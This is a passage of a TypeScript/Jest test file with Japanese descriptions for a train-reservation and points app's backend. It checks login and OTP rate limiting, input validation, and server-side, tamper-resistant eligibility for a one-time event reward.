      expect(balance()).toBe(Math.floor(7200 * 0.03));
    });

    it('デリバリーを席ごとに割り振ると、明細に残る(席の数・個数の範囲のものだけ)', () => {
      const send3 = (items: unknown[]) => send({ seatNo: '1A,1B,1C', totalPrice: 7200, items });
      expect(send3([{ name: '駅弁', quantity: 3, price: 800, seats: { '1A': 1, '1C': 2, '9Z': 4 } }, { name: 'お茶', quantity: 2, price: 150, seats: { '1B': 3 } }, { name: '菓子', quantity: 1, price: 300 }]).status).toBe('success');
      const detail = JSON.parse(String(grid[1][grid[0].indexOf('明細')]));
      expect(detail.items).toEqual([
        { name: '駅弁', quantity: 3, price: 800, seats: { '1A': 1, '1C': 2 } },
        { name: 'お茶', quantity: 2, price: 150 },
        { name: '菓子', quantity: 1, price: 300 },
      ]);
    });
  });
});

// ---- ログイン・登録の入口: 回数制限(同時に送っても抜けられない)と、入力の形・長さ ----
describe('ログインの回数制限と入力の検査', () => {
  const PW = 'Abcd1!ef';
  let cache: Record<string, string>;
  let lockFails: boolean;
  let lookups: string[];
  let counterAtLookup: number[];

  const wrong = { status: 'error', message: 'メールアドレスまたはパスワードが正しくありません。' };

  beforeEach(() => {
    cache = {};
    lockFails = false;
    lookups = [];
    counterAtLookup = [];
    gas.CacheService = {
      getScriptCache: () => ({
        get: (k: string) => cache[k] ?? null,
        put: (k: string, v: string) => void (cache[k] = v),
        remove: (k: string) => void delete cache[k],
      }),
    };
    gas.LockService = {
      getScriptLock: () => ({
        waitLock: () => {
          if (lockFails) throw new Error('busy');
        },
        releaseLock: () => undefined,
      }),
    };
    gas.loginFailureKey = (email: string) => 'fail:' + email;
    gas.hashPassword = (pw: string, salt: string) => 'h(' + pw + ',' + salt + ')';
    gas.createSessionToken = (id: string) => 'tok-' + id;
    gas.findMemberByEmail = (email: string) => {
      lookups.push(email);
      counterAtLookup.push(Number(cache['fail:' + email] ?? 0));
      return email === 'taro@example.com'
        ? { memberId: 'NZ-1', name: '太郎', email, salt: 's', passwordHash: 'h(' + PW + ',s)', rank: 'レギュラー', joinDate: '2026-10-01', lineUserId: '' }
        : null;
    };
  });

  it('ふつうのログインは通る(メールの大文字・前後の空白は、そろえる)', () => {
    const r = gas.handleLogin('  Taro@Example.com ', PW);
    expect(r).toMatchObject({ status: 'success', sessionToken: 'tok-NZ-1', user: { memberId: 'NZ-1', name: '太郎' } });
  });

  it('5回続けて間違えると、正しいパスワードでも、しばらく断る', () => {
    for (let i = 0; i < 5; i++) expect(gas.handleLogin('taro@example.com', 'bad' + i)).toEqual(wrong);
    expect(gas.handleLogin('taro@example.com', PW)).toMatchObject({ status: 'error', message: expect.stringContaining('しばらく') });
  });

  it('4回間違えたあと、正しければ通り、回数は消える(ふつうのログインは、締め出されない)', () => {
    for (let i = 0; i < 4; i++) gas.handleLogin('taro@example.com', 'bad' + i);
    expect(gas.handleLogin('taro@example.com', PW).status).toBe('success');
    for (let i = 0; i < 4; i++) expect(gas.handleLogin('taro@example.com', 'bad' + i)).toEqual(wrong);
    expect(gas.handleLogin('taro@example.com', PW).status).toBe('success');
  });

  it('メールごとに数える(ほかのメールの失敗に、巻き込まれない)', () => {
    for (let i = 0; i < 5; i++) gas.handleLogin('other@example.com', 'bad' + i);
    expect(gas.handleLogin('taro@example.com', PW).status).toBe('success');
  });

  it('試す回数は、パスワードを確かめる前に確保する(確かめている最中に同時に送られても、5回を超えて試せない)', () => {
    let nested = false;
    const lookup = gas.findMemberByEmail;
    gas.findMemberByEmail = (email: string) => {
      if (!nested) {
        nested = true;
        // 1回目を確かめているあいだに、ほかの20回が同時に届いたとする
        for (let i = 0; i < 20; i++) gas.handleLogin('taro@example.com', 'guess' + i);
      }
      return lookup(email);
    };
    gas.handleLogin('taro@example.com', 'first');
    expect(lookups.length).toBe(5); // 確かめられたのは、5回だけ
    expect(counterAtLookup[0]).toBeGreaterThanOrEqual(1); // 確かめる時点で、もう数えてある
  });

  it('止まっているあいだは、ロックを待たずに断る。ロックを取れないときは、確かめずに、混み合っていると返す', () => {
    cache['fail:taro@example.com'] = '5';
    lockFails = true;
    expect(gas.handleLogin('taro@example.com', PW)).toMatchObject({ message: expect.stringContaining('しばらく') });
    cache = {};
    expect(gas.handleLogin('taro@example.com', PW)).toMatchObject({ status: 'error', message: expect.stringContaining('混み合って') });
    expect(lookups).toEqual([]);
  });

  it('型違い・空・巨大な入力は、台帳も回数も見ずに、ふつうの失敗と同じ文言で断る', () => {
    const bad: Array<[unknown, unknown]> = [
      [undefined, PW], [null, PW], ['', PW], ['   ', PW], [123, PW], [{ a: 1 }, PW], [['taro@example.com'], PW],
      ['taro@example.com', undefined], ['taro@example.com', null], ['taro@example.com', ''], ['taro@example.com', 123456], ['taro@example.com', ['x']],
      ['a'.repeat(255), PW], ['taro@example.com', 'x'.repeat(129)], ['x'.repeat(100000), 'y'.repeat(100000)],
    ];
    bad.forEach(([e, p], i) => expect(gas.handleLogin(e, p), `#${i}`).toEqual(wrong));
    expect(lookups).toEqual([]);
    expect(Object.keys(cache)).toEqual([]);
  });

  it('上限ちょうど(メール254文字・パスワード128文字)は、受け付ける', () => {
    const longEmail = 'a'.repeat(242) + '@example.com'; // 254文字
    expect(longEmail.length).toBe(254);
    gas.handleLogin(longEmail, 'P'.repeat(128));
    expect(lookups).toEqual([longEmail]);
  });

  it('アカウント削除も、同じ回数制限と入力の検査を通る', () => {
    for (let i = 0; i < 5; i++) expect(gas.handleDeleteAccount('taro@example.com', 'bad' + i)).toEqual(wrong);
    expect(gas.handleDeleteAccount('taro@example.com', PW)).toMatchObject({ message: expect.stringContaining('しばらく') });
    expect(gas.handleDeleteAccount({ a: 1 }, PW)).toEqual(wrong);
    expect(gas.handleDeleteAccount('taro@example.com', 'x'.repeat(129))).toEqual(wrong);
  });
});

describe('会員の登録の入力の検査と、認証コードの回数制限', () => {
  let cache: Record<string, string>;
  let appended: unknown[][];
  let lockFails: boolean;
  const PW = 'Abcd1!ef';
  const EMAIL = 'hanako@example.com';

  beforeEach(() => {
    cache = { line_otp_ABC234: JSON.stringify({ code: '123456', lineUserId: 'U1' }) };
    appended = [];
    lockFails = false;
    gas.CacheService = {
      getScriptCache: () => ({
        get: (k: string) => cache[k] ?? null,
        put: (k: string, v: string) => void (cache[k] = v),
        remove: (k: string) => void delete cache[k],
      }),
    };
    gas.LockService = {
      getScriptLock: () => ({
        waitLock: () => {
          if (lockFails) throw new Error('busy');
        },
        releaseLock: () => undefined,
      }),
    };
    gas.findMemberByEmail = () => null;
    gas.getOrCreateMembersSheet = () => ({
      getDataRange: () => ({ getValues: () => [['会員ID']] }),
      appendRow: (r: unknown[]) => void appended.push(r),
    });
    gas.Utilities = { ...gas.Utilities, getUuid: () => 'salt' };
    gas.hashPassword = () => 'hash';
    gas.createSessionToken = () => 'tok';
  });

  const register = (o: Partial<Record<'email' | 'pw' | 'token' | 'code' | 'name', unknown>> = {}) =>
    gas.handleVerifyLineAndRegister(
      'email' in o ? o.email : EMAIL,
      'pw' in o ? o.pw : PW,
      'token' in o ? o.token : 'ABC234',
      'code' in o ? o.code : '123456',
      o.name
    );
  const refused = (r: { status: string }) => {
    expect(r.status).toBe('error');
    expect(appended).toEqual([]);
  };

  it('ふつうの登録は通る(日本語の名前30文字・長めのメール・128文字のパスワードも)', () => {
    expect(register({ name: '神埼太郎' }).status).toBe('success');
    cache.line_otp_ABC234 = JSON.stringify({ code: '123456', lineUserId: 'U1' });
    expect(register({ name: '神'.repeat(30), email: 'a'.repeat(100) + '@example.com' }).status).toBe('success');
    cache.line_otp_ABC234 = JSON.stringify({ code: '123456', lineUserId: 'U1' });
    expect(register({ pw: 'Aa1!' + 'x'.repeat(124) }).status).toBe('success');
    expect(appended.length).toBe(3);
  });

  it('表示名が31文字以上・文字でないときは、断る。渡さないとき・空のときは、メールの@の前(30文字まで)', () => {
    refused(register({ name: 'あ'.repeat(31) }));
    refused(register({ name: { a: 1 } }));
    refused(register({ name: 42 }));
    expect(register({ name: '' }).user.name).toBe('hanako');
    cache.line_otp_ABC234 = JSON.stringify({ code: '123456', lineUserId: 'U1' });
    expect(register({ email: 'b'.repeat(40) + '@example.com' }).user.name).toBe('b'.repeat(30));
  });

  it('メールが255文字以上・文字でない・形がおかしいときは、断る', () => {
    refused(register({ email: 'a'.repeat(243) + '@example.com' }));
    [undefined, null, 5, {}, [EMAIL], '', 'no-at-sign', 'a@b'].forEach((e) => refused(register({ email: e })));
  });

  it('パスワードが129文字以上・文字でないときは、断る(文言は、既存の言い方に合わせる)', () => {
    expect(register({ pw: 'Aa1!' + 'x'.repeat(125) })).toMatchObject({ message: 'パスワードは128文字以内で入力してください。' });
    [undefined, null, 123456, {}, ['Abcd1!ef']].forEach((p) => refused(register({ pw: p })));
  });

  it('合言葉・認証コードが、文字でない・空のときは、断る(例外にならない)', () => {
    [undefined, null, 5, {}, ['ABC234']].forEach((t) => refused(register({ token: t })));
    [undefined, null, '', '000000', 'abcdef', {}].forEach((c) => refused(register({ code: c })));
  });

  it('認証コードは5回まで。5回目の間違いで、合言葉が無効になり、正しいコードでも通らない', () => {
    for (let i = 0; i < 4; i++) expect(register({ code: '00000' + i })).toMatchObject({ message: '認証コードが正しくありません。' });
    expect(register({ code: '000009' })).toMatchObject({ message: expect.stringContaining('無効') });
    refused(register());
  });

  it('認証コードを試す回数は、確かめる前に確保する(5回試したあとは、正しいコードでも、確かめずに断る)', () => {
    cache['line_otp_fail_ABC234'] = '5'; // すでに5回試した
    expect(register({ code: '123456' })).toMatchObject({ status: 'error', message: expect.stringContaining('無効') });
    expect(cache['line_otp_ABC234']).toBeUndefined();
    expect(appended).toEqual([]);
  });

  it('ロックを取れないときは、確かめずに、混み合っていると返す', () => {
    lockFails = true;
    expect(register({ code: '123456' })).toMatchObject({ status: 'error', message: expect.stringContaining('混み合って') });
    expect(appended).toEqual([]);
  });
});

// ---- 公開記念イベントのごほうび(claimEventTare): サーバーで判定して、1人1回だけ ----
describe('公開記念イベントのごほうび(claimEventTare)', () => {
  const H = ['予約日時', '予約番号', 'LINE_USER_ID', '列車名', '号車', '座席番号', '席種', '乗車駅', '降車駅', '合計金額', 'ステータス', '会員ID', '予約日', '出発時刻', '到着時刻', '乗車日時', '初回登録日時', '初回の内容'];
  const jst = (s: string) => Date.parse(s + '+09:00');
  const START = jst('2026-11-01T00:00:00');
  let grid: unknown[][];
  let now: number;
  let cache: Record<string, string>;
  let props: Record<string, string>;
  let lockFails: boolean;

  const resv = (o: Record<string, unknown> = {}) => {
    const v: Record<string, unknown> = {
      予約日時: '2026/11/01 00:10:00', 予約番号: 'EQ-100', LINE_USER_ID: '', 列車名: '特急めぐり 15号', 号車: 1, 座席番号: '1A', 席種: '指定席',
      乗車駅: '東京駅', 降車駅: '土浦駅', 合計金額: 3000, ステータス: '予約確定', 会員ID: 'M1', 予約日: '2026-11-01', 出発時刻: '10:05',
      到着時刻: '12:00', 乗車日時: '', 初回登録日時: '2026/11/01 09:00:00', ...o,
    };
    // 判定は、最初に登録された内容だけを見る。指定がなければ、いまの列と同じ内容で、最初に登録されたことにする
    if (!('初回の内容' in o)) v['初回の内容'] = JSON.stringify({ train: v['列車名'], from: v['乗車駅'], to: v['降車駅'], date: v['予約日'], dep: v['出発時刻'] });
    return H.map((h) => v[h]);
  };
  const claim = (orderId: unknown = 'EQ-100', token = 'ok') => gas.handleClaimEventTare(token, orderId);
  const ledgerRows = () => rows.slice(1).filter((r) => r[1] === 'M1');

  beforeEach(() => {
    grid = [[...H], resv()];
    now = jst('2026-11-01T10:42:00'); // 10:05発 + 36分40秒より後
    cache = {};
    props = {};
    lockFails = false;
    gas.nowMs = () => now;
    gas.getDataSpreadsheet = () => ({ getSheetByName: () => ({ getDataRange: () => ({ getValues: () => grid.map((r) => [...r]) }) }) });
    gas.CacheService = {
      getScriptCache: () => ({
        get: (k: string) => cache[k] ?? null,
        put: (k: string, v: string) => void (cache[k] = v),
        remove: (k: string) => void delete cache[k],
      }),
    };
    gas.LockService = {
      getScriptLock: () => ({
        waitLock: () => {
          if (lockFails) throw new Error('busy');
        },
        releaseLock: () => undefined,
      }),
    };
    gas.PropertiesService = { getScriptProperties: () => ({ getProperty: (k: string) => props[k] ?? '' }) };
    put('welcome', 'welcome', 100);
  });

  it('条件を満たせば、350ptと名札が付く(額は、サーバーの定数)', () => {
    const r = claim();
    expect(r).toMatchObject({ status: 'success', added: true, points: 350, balance: 450 });
    const last = rows[rows.length - 1];
    expect(last.slice(1, 5)).toEqual(['M1', 'event', 'event:tare', 350]);
    expect(String(last[5])).toContain('味覚捜査班');
  });

  it('二重に押しても、1回だけ(台帳に同じ行を2つ作らない)', () => {
    claim();
    expect(claim()).toMatchObject({ status: 'success', added: false, points: 0, balance: 450 });
    expect(ledgerRows().filter((r) => r[3] === 'event:tare').length).toBe(1);
  });

  it('ポイントの付与の1日の上限は、このイベントに効かない', () => {
    for (let i = 0; i < 3; i++) put('reservation', `reservation:X${i}`, 1500); // きょうの上限(3000pt)を使い切った状態
    expect(claim()).toMatchObject({ status: 'success', added: true, points: 350 });
  });

  it('サーバーの時刻が、2026-11-01 0:00より前なら、付かない', () => {
    grid[1] = resv({ 予約日: '2026-10-31', 出発時刻: '10:05', 初回登録日時: '2026/10/31 09:00:00' });
    now = jst('2026-10-31T23:59:59');
    expect(claim()).toMatchObject({ status: 'error', code: 'event_not_yet' });
    now = jst('2026-11-01T10:42:00');
    expect(claim()).toMatchObject({ status: 'error', code: 'event_not_yet' }); // 乗車日時が、開始より前
    expect(ledgerRows().length).toBe(1);
  });

  it('発車から36分40秒(2200秒)たつまでは付かない。ちょうどで付く', () => {
    now = jst('2026-11-01T10:41:39');
    expect(claim()).toMatchObject({ code: 'event_not_yet' });
    now = jst('2026-11-01T10:41:40');
    expect(claim().status).toBe('success');
  });

  it('端末から送った時刻・額は、見ない(予約番号だけ受け取る)', () => {
    now = jst('2026-11-01T10:00:00');
    expect(gas.handleClaimEventTare('ok', 'EQ-100', 99999, '2000-01-01')).toMatchObject({ code: 'event_not_yet' });
    expect(gas.handleClaimEventTare.length).toBe(2);
  });

  it('降りる駅が、土浦・ひたちなか海浜公園・日立なら通り、それ以外(柏・松戸など)は断る', () => {
    ['土浦', 'ひたちなか海浜公園駅', '日立'].forEach((d, i) => {
      rows.length = 2;
      cache = {};
      grid[1] = resv({ 降車駅: d });
      expect(claim().status, d).toBe('success');
      rows.splice(2); // 受け取りの行を消して、次を試す
      rows[1] = ['t', 'M1', 'welcome', 'welcome', 100, 'x'];
      void i;
    });
    ['柏', '松戸', '北千住', '東京', '大宮', ''].forEach((d) => {
      cache = {};
      grid[1] = resv({ 降車駅: d });
      expect(claim(), d).toMatchObject({ code: 'event_not_yet' });
    });
  });

  it('東京発でない・特急めぐりでない・取り消し・ほかの会員の予約・予約番号が違う、は断る', () => {
    const bad: Array<Record<string, unknown>> = [
      { 乗車駅: '松戸駅' }, { 乗車駅: '土浦駅', 降車駅: '日立駅' }, { 列車名: '特急あやみ 101号' }, { 列車名: '特急Nライナー 3号' },
      { ステータス: 'キャンセル' }, { 会員ID: 'M2' }, { 予約番号: 'EQ-200' },
    ];
    bad.forEach((o) => {
      cache = {};
      grid[1] = resv(o);
      expect(claim(), JSON.stringify(o)).toMatchObject({ code: 'event_not_yet' });
    });
    expect(ledgerRows().length).toBe(1);
  });

  it('始発(5:05)と、ダイヤにない時刻は、対象外。5:35から23:05までの30分おきは通る', () => {
    ['05:05', '05:36', '05:00', '00:05', '04:35', '23:35', '10:00', '24:05', 'abc', ''].forEach((t) => {
      cache = {};
      grid[1] = resv({ 出発時刻: t, 初回登録日時: '2026/11/01 00:01:00' }); // 登録の時刻は、ほかの条件で断られないように、早くしておく
      now = jst('2026-11-02T12:00:00');
      expect(claim(), t).toMatchObject({ code: 'event_not_yet' });
    });
    ['05:35', '06:05', '12:35', '23:05'].forEach((t) => {
      cache = {};
      rows.splice(2);
      grid[1] = resv({ 出発時刻: t, 予約日: '2026-11-01', 初回登録日時: '2026/11/01 00:30:00' });
      now = jst('2026-11-02T12:00:00');
      expect(claim().status, t).toBe('success');
    });
  });

  it('予約が、発車の5分前より後に、サーバーへ登録されたものは、付かない(5分前ちょうどは、通る)', () => {
    grid[1] = resv({ 初回登録日時: '2026/11/01 10:00:01' });
    expect(claim()).toMatchObject({ code: 'event_not_yet' });
    grid[1] = resv({ 初回登録日時: '2026/11/01 10:00:00' });
    expect(claim().status).toBe('success');
  });

  it('登録の時刻が無い・読めない予約(公開前の古い形)は、例外にならず、対象外', () => {
    ['', undefined, 'きのう', 12345, '2026-11-01'].forEach((v) => {
      cache = {};
      grid[1] = resv({ 初回登録日時: v });
      expect(claim(), String(v)).toMatchObject({ code: 'event_not_yet' });
    });
    // 列そのものが無い古い台帳・見出ししか無い台帳・台帳が無い
    const oldHeaders = H.filter((h) => h !== '初回登録日時' && h !== '乗車日時');
    grid = [[...oldHeaders], oldHeaders.map(() => 'x')];
    cache = {};
    expect(claim()).toMatchObject({ code: 'event_not_yet' });
    grid = [[...H]];
    cache = {};
    expect(claim()).toMatchObject({ code: 'event_not_yet' });
    gas.getDataSpreadsheet = () => ({ getSheetByName: () => null });
    cache = {};
    expect(claim()).toMatchObject({ code: 'event_not_yet' });
  });

  it('日付の型で入っている登録日時も、読める', () => {
    const ctxDate = (iso: string) => vm.runInContext(`new Date('${iso}')`, gas); // 台帳の読み出しと同じ世界の Date
    grid[1] = resv({ 初回登録日時: ctxDate('2026-11-01T09:00:00+09:00') });
    gas.Utilities = {
      formatDate: (d: Date, _tz: string, pattern: string) => {
        const j = new Date(d.getTime() + 9 * 3600 * 1000).toISOString();
        const [y, mo, da] = [j.slice(0, 4), j.slice(5, 7), j.slice(8, 10)];
        return pattern === 'yyyy-MM-dd' ? `${y}-${mo}-${da}` : `${y}/${mo}/${da} ${j.slice(11, 19)}`;
      },
    };
    expect(claim().status).toBe('success');
  });

  it('おかしな予約番号(文字でない・空・長すぎる・記号)は、断る', () => {
    [undefined, null, 5, {}, ['EQ-100'], '', 'x'.repeat(41), 'EQ 100', 'EQ_100'].forEach((o) => {
      cache = {};
      const r = gas.handleClaimEventTare('ok', o); // (claim() は、undefined を既定の番号にするので、直接呼ぶ)
      expect([String(o), r.code]).toEqual([String(o), 'event_not_yet']);
    });
  });

  it('断りの返事は、何が足りないかを区別しない(同じ文言・同じ code)', () => {
    const reasons = [{ 降車駅: '柏' }, { 出発時刻: '05:05' }, { ステータス: 'キャンセル' }, { 初回登録日時: '2026/11/01 10:30:00' }];
    const replies = reasons.map((o) => {
      cache = {};
      grid[1] = resv(o);
      return claim();
    });
    replies.forEach((r) => expect(r).toEqual(replies[0]));
    expect(replies[0]).toEqual({ status: 'error', code: 'event_not_yet', message: 'まだ対象ではありません。' });
  });

  it('総当たりを防ぐ: 5回まで。止まったあとは、条件を満たしても、しばらく断る。成功すると、回数は消える', () => {
    grid[1] = resv({ 降車駅: '柏' });
    for (let i = 0; i < 5; i++) expect(claim()).toMatchObject({ code: 'event_not_yet' });
    grid[1] = resv();
    expect(claim()).toMatchObject({ status: 'error', code: 'event_locked' });
    cache = {}; // 10分たった
    expect(claim().status).toBe('success');
    expect(cache['event_tare_try_M1']).toBeUndefined();
  });

  it('止まっているときは、ロックを待たずに断る。ロックを取れないときは、確かめずに混み合っていると返す', () => {
    cache['event_tare_try_M1'] = '5';
    lockFails = true;
    expect(claim()).toMatchObject({ code: 'event_locked' });
    cache = {};
    expect(claim()).toMatchObject({ status: 'error', code: 'event_busy' });
    expect(ledgerRows().length).toBe(1);
  });

  it('試す回数は、確かめる前に確保する(確かめている最中に同時に届いても、5回を超えて試せない)', () => {
    let nested = false;
    let checks = 0;
    const base = gas.isEventTareEligible;
    gas.isEventTareEligible = (...a: unknown[]) => {
      checks++;
      if (!nested) {
        nested = true;
        for (let i = 0; i < 20; i++) claim();
      }
      return base(...a);
    };
    claim();
    expect(checks).toBeLessThanOrEqual(5);
  });

  it('ログインの有効期限が切れているときは、断る。最初の同期の前は、付けない', () => {
    expect(claim('EQ-100', 'bad')).toMatchObject({ status: 'error', code: 'session' });
    rows.length = 1; // 台帳が空(同期の前)
    expect(claim().status).toBe('error');
    expect(rows.length).toBe(1);
  });

  it('アプリから、判定なしで、受け取ることはできない(earnEventReward・端末の申告・コード)', () => {
    expect(gas.handleEarnEventReward('ok', 'tare')).toMatchObject({ status: 'error' });
    expect(gas.eventRewardsFrom({ eventRewards: ['tare', 'event:tare'] })).toEqual([]);
    expect(vm.runInContext('EVENT_REWARD_TABLE.tare', gas)).toBeUndefined();
    expect(ledgerRows().length).toBe(1);
  });

  it('スクリプトプロパティで、開始を前にずらせる(公開前の動作確認用。ふだんは、設定しない)', () => {
    grid[1] = resv({ 予約日: '2026-10-31', 初回登録日時: '2026/10/31 09:00:00' });
    now = jst('2026-10-31T10:42:00');
    expect(claim()).toMatchObject({ code: 'event_not_yet' });
    props.EVENT_TARE_START_MS = String(jst('2026-10-30T00:00:00'));
    expect(claim().status).toBe('success');
  });

  it('受け取り済みかを、アカウントのデータに入れる(eventTareCleared)', () => {
    const build = () => gas.buildAccountData('M1', gas.readMemberPoints('M1'), { codes: [] }, { stage: 1, stamps: [], cleared: false });
    gas.getOrCreateSheetWithHeaders = () => ({ getDataRange: () => ({ getValues: () => rows.map((r) => [...r]) }), appendRow: (r: unknown[]) => void rows.push(r) });
    expect(build().eventTareCleared).toBe(false);
    claim();
    expect(build().eventTareCleared).toBe(true);
  });
});

describe('予約の最初の登録の日時(初回登録日時)', () => {
  const H = ['予約日時', '予約番号', 'LINE_USER_ID', '列車名', '号車', '座席番号', '席種', '乗車駅', '降車駅', '合計金額', 'ステータス', '会員ID', '予約日', '出発時刻', '到着時刻', '乗車日時', '初回登録日時'];
  let grid: unknown[][];
  let clock: string;

  beforeEach(() => {
    grid = [[...H]];
    clock = '2026/11/01 09:00:00';
    const sheet = {
      getDataRange: () => ({ getValues: () => grid.map((r) => [...r]) }),
      appendRow: (r: unknown[]) => void grid.push([...r]),
      getLastRow: () => grid.length,
      getLastColumn: () => grid[0].length,
      getRange: (row: number, col: number) => ({
        getValues: () => [grid[row - 1].slice(col - 1, col)],
        setValue: (v: unknown) => void (grid[row - 1][col - 1] = v),
        setValues: (vs: unknown[][]) => vs.forEach((r, i) => r.forEach((v, j) => void (grid[row - 1 + i][col - 1 + j] = v))),
        setNumberFormat: () => undefined,
      }),
    };
    gas.verifySessionToken = () => 'M1';
    gas.findMemberById = () => ({ memberId: 'M1', lineUserId: '' });
    gas.getOrCreateReservationsSheet = () => sheet;
    gas.nowText = () => clock;
    gas.Utilities = { formatDate: () => '2026/11/01 12:00:00' };
  });

  const send = (total: number) =>
    gas.handleCreateReservation('t', {
      orderId: 'EQ-1', trainName: '特急めぐり 15号', carNo: 1, seatNo: '1A', seatType: '指定席', boardingStation: '東京駅', destinationStation: '土浦駅',
      totalPrice: total, reservedDate: '2026-11-01', departureTime: '10:05', arrivalTime: '12:00',
    }, false);

  it('最初に登録された日時を残し、更新(デリバリーの追加など)では、変えない', () => {
    send(3000);
    expect(grid[1][H.indexOf('初回登録日時')]).toBe('2026/11/01 09:00:00');
    clock = '2026/11/01 11:30:00'; // 発車のあとに、デリバリーを足した
    send(4000);
    expect(grid[1][H.indexOf('初回登録日時')]).toBe('2026/11/01 09:00:00');
    expect(grid[1][H.indexOf('合計金額')]).toBe(4000);
  });
});

describe('イベントの判定は、最初の内容だけを見る(更新で書き換えても迂回できない)', () => {
  it('いまの列を書き換えても、最初の内容が条件を満たさなければ、付かない', () => {
    const H = ['予約日時', '予約番号', 'LINE_USER_ID', '列車名', '号車', '座席番号', '席種', '乗車駅', '降車駅', '合計金額', 'ステータス', '会員ID', '予約日', '出発時刻', '到着時刻', '乗車日時', '初回登録日時', '初回の内容'];
    const first = JSON.stringify({ train: '特急めぐり 15号', from: '東京駅', to: '土浦駅', date: '2026-12-31', dep: '10:05' }); // 遠い日付で登録
    const row = ['', 'EQ-100', '', '特急めぐり 15号', 1, '1A', '指定席', '東京駅', '土浦駅', 3000, '予約確定', 'M1', '2026-11-01', '10:05', '12:00', '', '2026/11/01 09:00:00', first]; // いまの列は、過去の発車に書き換え済み
    gas.nowMs = () => Date.parse('2026-11-01T10:42:00+09:00');
    gas.getDataSpreadsheet = () => ({ getSheetByName: () => ({ getDataRange: () => ({ getValues: () => [H, row] }) }) });
    gas.CacheService = { getScriptCache: () => ({ get: () => null, put: () => undefined, remove: () => undefined }) };
    gas.PropertiesService = { getScriptProperties: () => ({ getProperty: () => '' }) };
    rows.push(['t', 'M1', 'welcome', 'welcome', 100, 'x']);
    expect(gas.handleClaimEventTare('ok', 'EQ-100')).toMatchObject({ code: 'event_not_yet' });
    row[17] = ''; // 最初の内容が無い(公開前の古い予約)・読めない
    expect(gas.handleClaimEventTare('ok', 'EQ-100')).toMatchObject({ code: 'event_not_yet' });
    row[17] = '{こわれた';
    expect(gas.handleClaimEventTare('ok', 'EQ-100')).toMatchObject({ code: 'event_not_yet' });
  });
});
